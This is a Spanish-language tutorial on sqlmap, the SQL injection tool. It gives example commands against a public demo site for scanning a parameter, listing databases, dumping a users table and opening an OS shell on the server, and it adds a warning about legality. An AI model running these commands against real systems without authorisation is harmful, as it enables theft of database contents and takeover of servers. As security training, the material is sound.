# sqlmap

## ¿Qué es sqlmap?

sqlmap es la herramienta de código abierto más famosa y potente para **automatizar la detección y explotación de vulnerabilidades de inyección SQL** y tomar el control de los servidores de bases de datos.

Es considerada la navaja suiza para cualquier pentester o especialista en seguridad de aplicaciones web. Si una aplicación web tiene una vulnerabilidad de inyección SQL, sqlmap la encontrará y la explotará. Su motor de detección es muy potente y soporta una enorme cantidad de técnicas de inyección y tipos de bases de datos.

## ¿Para qué es útil?

sqlmap automatiza el tedioso proceso manual de explotar una inyección SQL. Sus capacidades son inmensas:

*   **Detección y Explotación:** Detecta automáticamente si un parámetro en una URL es vulnerable a inyección SQL.
*   **Enumeración de Bases de Datos:** Una vez que encuentra una vulnerabilidad, puede:
    *   Listar usuarios, contraseñas (y a menudo crackear los hashes).
    *   Listar bases de datos, tablas, columnas y sus tipos de datos.
    *   Extraer (dumpear) el contenido completo de las tablas.
*   **Acceso al Sistema de Archivos:** En ciertas configuraciones de bases de datos (como MySQL, PostgreSQL), puede leer y escribir archivos en el sistema de archivos del servidor.
*   **Ejecución de Comandos en el Sistema Operativo:** En configuraciones permisivas, sqlmap puede obtener una **shell interactiva** en el sistema operativo del servidor, dándole al atacante control total sobre la máquina.
*   **Soporte Extensivo:** Es compatible con una gran variedad de sistemas de gestión de bases de datos (DBMS), incluyendo MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, y muchos más.

## ¿Cómo se usa? (Ejemplos básicos)

sqlmap es una herramienta de línea de comandos muy rica en opciones.

**Ejemplo 1: Escaneo básico de una URL**

Este es el comando más básico. Le dices a sqlmap que revise una URL que tiene un parámetro.

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
```
*   `-u`: Especifica la URL a probar. sqlmap identificará automáticamente el parámetro `cat` y comenzará a probarlo.

sqlmap te hará una serie de preguntas interactivas. Puedes responder `y` (sí) a la mayoría de ellas si no estás seguro.

**Ejemplo 2: Enumerar las bases de datos**

Una vez que sqlmap confirma una vulnerabilidad, puedes empezar a enumerar.

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
```
*   `--dbs`: Le pide a sqlmap que liste todas las bases de datos a las que tiene acceso.

**Ejemplo 3: Dumpear una tabla completa**

Supongamos que encontraste una base de datos llamada `acuart` y una tabla llamada `users`.

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump
```
*   `-D acuart`: Especifica la base de datos.
*   `-T users`: Especifica la tabla.
*   `--dump`: Extrae todo el contenido de la tabla.

**Ejemplo 4: Obtener una shell del sistema operativo**

Si la base de datos y los permisos lo permiten, este es el "santo grial".

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --os-shell
```
*   `--os-shell`: Intenta obtener una shell interactiva en el servidor.

## Consideraciones Adicionales

*   **Herramienta Estándar de la Industria:** El conocimiento de sqlmap es absolutamente fundamental para cualquier persona que trabaje en seguridad de aplicaciones web.
*   **Automatización con `--batch`:** Para evitar las preguntas interactivas, puedes usar la opción `--batch`, que aceptará las respuestas por defecto para todo.
*   **Legalidad y Ética:** sqlmap es una herramienta de ataque. Usarla contra cualquier sistema sin permiso explícito y por escrito es ilegal y puede tener consecuencias graves. Debe ser utilizada estrictamente en entornos de pentesting autorizados.

---
*Nota: sqlmap es posiblemente una de las herramientas de hacking más potentes y conocidas. Trátala con el máximo respeto y responsabilidad.*
